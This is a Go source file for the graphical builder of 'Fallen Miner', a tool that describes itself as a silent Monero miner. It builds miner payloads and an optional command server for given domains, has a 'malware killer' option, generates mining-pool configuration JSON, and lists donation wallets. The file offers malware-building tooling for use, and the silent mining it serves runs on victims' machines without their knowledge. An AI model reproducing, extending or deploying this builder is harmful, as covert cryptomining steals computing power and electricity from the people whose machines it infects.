package main

import (
	"embed"
	"encoding/json"
	"fmt"
	"image/color"
	"log"
	"net/url"
	"strconv"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"

	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

//go:embed icon.jpg
var iconFile embed.FS

func main() {
	iconData, err := iconFile.ReadFile("icon.jpg")
	if err != nil {
		log.Fatal("Failed to read embedded icon:", err)
	}
	iconResource := fyne.NewStaticResource("icon.jpg", iconData)
	Fallen := app.New()
	FallenWindow := Fallen.NewWindow("Fallen Builder")

	FallenWindow.Resize(fyne.NewSize(875, 500))
	FallenWindow.SetFixedSize(true)

	FallenWindow.SetIcon(iconResource)
	image := canvas.NewImageFromResource(iconResource)
	image.SetMinSize(fyne.NewSize(250, 250))
	image.FillMode = canvas.ImageFillContain

	image.Resize(fyne.NewSize(250, 250))

	serverAddressEntry := widget.NewEntry()
	serverAddressEntry.SetPlaceHolder("Enter Server addresses formatted with commas (eg domain1.com,domain2.com)")
	servercheck := widget.NewCheck("Build Server?", func(bool) {})
	malwarecheck := widget.NewCheck("Enable Malware killer?", func(bool) {})

	tab1Content := container.NewVBox(
		widget.NewLabel("Builder"),
		serverAddressEntry,
		servercheck,
		malwarecheck,

		widget.NewButton("Check Requirements", func() {
			supported := isGoVersionSupported() || isGCCInstalled()
			if supported {
				dialog.ShowInformation("Requirements", "Requirements are met!", FallenWindow)
			} else {
				dialog.ShowInformation("Requirements", "Requirements are not met. You are either using a version of go below 1.18, or do not have GCC installed.", FallenWindow)
			}

		}),

		widget.NewButton("Build", func() {
			serverAddress := serverAddressEntry.Text
			if serverAddress != "" {
				if servercheck.Checked {
					if malwarecheck.Checked {
						buildall(serverAddress, true, true, FallenWindow)
					} else {
						buildall(serverAddress, true, false, FallenWindow)
					}
				} else {
					if malwarecheck.Checked {
						buildall(serverAddress, false, true, FallenWindow)
					} else {
						buildall(serverAddress, false, false, FallenWindow)
					}
				}
			} else {
				dialog.ShowInformation("Error", "Please enter a server address.", FallenWindow)
			}
		}),
	)

	appNameLabel := canvas.NewText("Fallen Miner, an open source silent XMR Miner.", color.White)
	appNameLabel.TextSize = 15

	donateLabel := canvas.NewText("Want to donate directly?", color.White)
	donateLabel.TextSize = 15

	XMRbutton := widget.NewButton("XMR - Click to copy to clipboard", func() {
		clipboard := FallenWindow.Clipboard()
		clipboard.SetContent("85VkL5hw9YceMWVHPGNoFgLxQxw6qwNdF51uAz96WPYmhDYwswVHhoaWPXWjvFGBstGhUNBgR9UvqcqVvYHDmAvcC9yPy4S")
	})

	BTCbutton := widget.NewButton("BTC - Click to copy to clipboard", func() {
		clipboard := FallenWindow.Clipboard()
		clipboard.SetContent("bc1qrj9006vls5udt907ad8jvkts5e4d5tlua5794d")
	})

	LTCbutton := widget.NewButton("LTC - Click to copy to clipboard", func() {
		clipboard := FallenWindow.Clipboard()
		clipboard.SetContent("ltc1qw7stjsqayppp726jgjwp2362djw7jplqzj2r0c")
	})

	SOLbutton := widget.NewButton("SOL - Click to copy to clipboard", func() {
		clipboard := FallenWindow.Clipboard()
		clipboard.SetContent("F1EtBxf4sPhUsfPdA2jVFfqJ7eLbbkxx4f2ujVhuPrxT")
	})

	githuburl, _ := url.Parse("https://github.com/laprosa/Fallen-Miner")

	githubLink := widget.NewHyperlink("Created by Incog, you should of downloaded this from my github", githuburl)

	textContainer := container.NewVBox(
		layout.NewSpacer(),
		appNameLabel,
		layout.NewSpacer(),
		githubLink,
		donateLabel,
		XMRbutton,
		BTCbutton,
		LTCbutton,
		SOLbutton,
	)

	textContainer = container.NewCenter(textContainer)

	tab2Content := container.NewVBox(
		image,
		textContainer,
	)

	addressEntry := widget.NewEntry()
	addressEntry.SetPlaceHolder("Enter address...")

	idleThreadsEntry := widget.NewEntry()
	idleThreadsEntry.SetPlaceHolder("Enter idle threads...")

	idleTimeEntry := widget.NewEntry()
	idleTimeEntry.SetPlaceHolder("Enter idle time...")

	passwordEntry := widget.NewEntry()
	passwordEntry.SetPlaceHolder("Enter password...")

	poolEntry := widget.NewEntry()
	poolEntry.SetPlaceHolder("Enter pool...")

	threadsEntry := widget.NewEntry()
	threadsEntry.SetPlaceHolder("Enter threads...")

	sslEntry := widget.NewEntry()
	sslEntry.SetPlaceHolder("Enter SSL (0 or 1)...")

	createJSONButton := widget.NewButton("Create JSON", func() {

		idleThreads, err := strconv.Atoi(idleThreadsEntry.Text)
		if err != nil {
			dialog.ShowError(fmt.Errorf("invalid idle threads: %v", err), FallenWindow)
			return
		}

		idleTime, err := strconv.Atoi(idleTimeEntry.Text)
		if err != nil {
			dialog.ShowError(fmt.Errorf("invalid idle time: %v", err), FallenWindow)
			return
		}

		threads, err := strconv.Atoi(threadsEntry.Text)
		if err != nil {
			dialog.ShowError(fmt.Errorf("invalid threads: %v", err), FallenWindow)
			return
		}

		ssl, err := strconv.Atoi(sslEntry.Text)
		if err != nil || (ssl != 0 && ssl != 1) {
			dialog.ShowError(fmt.Errorf("invalid SSL value (must be 0 or 1): %v", err), FallenWindow)
			return
		}

		data := map[string]interface{}{
			"address":      addressEntry.Text,
			"threads":      threads,
			"idle_threads": idleThreads,
			"idle_time":    idleTime,
			"password":     passwordEntry.Text,
			"pool":         poolEntry.Text,
			"ssl":          ssl,
		}

		jsonArray := []map[string]interface{}{data}

		jsonData, err := json.MarshalIndent(jsonArray, "", "  ")
		if err != nil {
			dialog.ShowError(fmt.Errorf("failed to create JSON: %v", err), FallenWindow)
			return
		}

		FallenWindow.Clipboard().SetContent(string(jsonData))

		dialog.ShowInformation("JSON Created", "JSON copied to clipboard!", FallenWindow)
	})

	configContainer := container.NewVBox(
		widget.NewLabel("Address:"),
		addressEntry,
		widget.NewLabel("Threads:"),
		threadsEntry,
		widget.NewLabel("Idle Threads:"),
		idleThreadsEntry,
		widget.NewLabel("Idle Time:"),
		idleTimeEntry,
		widget.NewLabel("Password:"),
		passwordEntry,
		widget.NewLabel("Pool:"),
		poolEntry,
		widget.NewLabel("SSL (0 or 1):"),
		sslEntry,
		createJSONButton,
	)

	tab3Content := container.NewVBox(
		configContainer,
	)

	tab1 := container.NewTabItemWithIcon("Builder", theme.ComputerIcon(), tab1Content)
	tab2 := container.NewTabItemWithIcon("About", theme.InfoIcon(), tab2Content)
	tab3 := container.NewTabItemWithIcon("Generate config", theme.FileIcon(), tab3Content)

	tabs := container.NewAppTabs(tab1, tab3, tab2)

	FallenWindow.SetContent(tabs)

	FallenWindow.ShowAndRun()
}
